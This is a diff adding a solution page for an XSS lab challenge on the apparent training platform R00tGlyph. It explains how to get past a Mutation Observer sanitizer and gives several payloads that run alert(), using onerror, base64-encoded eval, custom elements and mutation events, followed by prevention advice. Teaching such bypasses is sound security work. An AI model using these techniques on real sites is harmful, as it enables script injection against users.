@@ -1,0 +1,139 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 10 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 10 Solution: XSS with Mutation Observer Bypass</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how Mutation Observers, which are used by some applications to detect and remove malicious content from the DOM, can be bypassed. The application uses a Mutation Observer to sanitize content as soon as it's added to the DOM, but there are ways to execute JavaScript before the observer can act.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to understand how Mutation Observers work and exploit their limitations.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Mutation Observers have several limitations that can be exploited:</p>
+                        <ol>
+                            <li>They operate asynchronously, meaning there's a small window of time between when content is added to the DOM and when the observer processes it.</li>
+                            <li>They can only detect changes to the DOM that they're specifically configured to watch for.</li>
+                            <li>They can be overwhelmed by making many changes to the DOM at once.</li>
+                        </ol>
+                        
+                        <p>In this challenge, the Mutation Observer is configured to watch for script tags and event handlers, but it has several weaknesses:</p>
+                        <ul>
+                            <li>It operates asynchronously, creating a race condition.</li>
+                            <li>It doesn't detect all possible ways to execute JavaScript.</li>
+                            <li>It doesn't handle nested elements efficiently.</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Exploiting the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>There are several ways to bypass the Mutation Observer in this challenge:</p>
+                        
+                        <h6>Method 1: Race Condition Exploit</h6>
+                        <p>This method exploits the asynchronous nature of Mutation Observers by executing JavaScript immediately when the element is created, before the observer has a chance to sanitize it:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;img src="x" onerror="alert('XSS Level 10 Completed!')" onload="alert('XSS Level 10 Completed!')"&gt;</code></pre>
+                        
+                        <p>The <code>onerror</code> event fires immediately when the image fails to load, which happens before the Mutation Observer can remove the attribute.</p>
+                        
+                        <h6>Method 2: Using setTimeout with 0 Delay</h6>
+                        <p>Another approach is to use <code>setTimeout</code> with a 0ms delay, which pushes the execution to the next event loop cycle, after the current synchronous code (including the initial Mutation Observer callback) has completed:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;img src="x" onerror="setTimeout(function() { alert('XSS Level 10 Completed!'); }, 0)"&gt;</code></pre>
+                        
+                        <h6>Method 3: DOM Clobbering</h6>
+                        <p>DOM Clobbering can be used to override properties or methods that the Mutation Observer relies on:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;form id="attributes"&gt;&lt;/form&gt;
+&lt;img src="x" onerror="alert('XSS Level 10 Completed!')"&gt;</code></pre>
+                        
+                        <p>This creates an element with id="attributes" which can interfere with the observer's ability to check attributes.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Alternative Approaches</h5>
+                    </div>
+                    <div class="card-body">
+                        <h6>1. Using Base64 Encoding</h6>
+                        <p>Encode the payload to bypass pattern matching:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;img src="x" onerror="eval(atob('YWxlcnQoJ1hTUyBMZXZlbCAxMCBDb21wbGV0ZWQhJyk='))"&gt;</code></pre>
+                        
+                        <h6>2. Using Custom Elements</h6>
+                        <p>Create a custom element with a constructor that executes JavaScript:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;script&gt;
+class XSSElement extends HTMLElement {
+  constructor() {
+    super();
+    alert('XSS Level 10 Completed!');
+  }
+}
+customElements.define('xss-element', XSSElement);
+&lt;/script&gt;
+&lt;xss-element&gt;&lt;/xss-element&gt;</code></pre>
+                        
+                        <h6>3. Using MutationEvent (Deprecated but Sometimes Works)</h6>
+                        <p>Use the older MutationEvent API which can sometimes interfere with MutationObserver:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;div onDOMNodeInserted="alert('XSS Level 10 Completed!')"&gt;&lt;/div&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Race Conditions:</strong> Asynchronous security controls can create race conditions that attackers can exploit.</li>
+                            <li><strong>Incomplete Filtering:</strong> Client-side filtering that doesn't account for all possible attack vectors is ineffective.</li>
+                            <li><strong>DOM-based Vulnerabilities:</strong> Manipulating the DOM can lead to security issues that are difficult to detect.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Server-side Validation:</strong> Always validate and sanitize input on the server side, not just the client side.</li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to prevent the execution of inline scripts.</li>
+                            <li><strong>Sanitization Libraries:</strong> Use established sanitization libraries like DOMPurify that are designed to handle edge cases.</li>
+                            <li><strong>Synchronous Validation:</strong> When possible, validate content before it's added to the DOM, not after.</li>
+                            <li><strong>Defense in Depth:</strong> Implement multiple layers of security controls to protect against different types of attacks.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            Mutation Observer bypass vulnerabilities have been found in real-world applications, including content management systems, social media platforms, and collaborative tools. These vulnerabilities can allow attackers to inject malicious JavaScript that steals sensitive information, hijacks user sessions, or performs actions on behalf of the user. The asynchronous nature of Mutation Observers makes these vulnerabilities particularly difficult to detect and fix.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level10') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
